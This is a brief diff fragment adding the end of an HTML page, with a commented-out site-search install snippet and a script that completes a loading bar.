+  _st('install','FHMeAyBdVccJECstf-XJ','2.0.0');
+</script>
+-->
+
+  <script>document.getElementById("loading-bar").style.width="100%";</script>
+</body>
+</html>
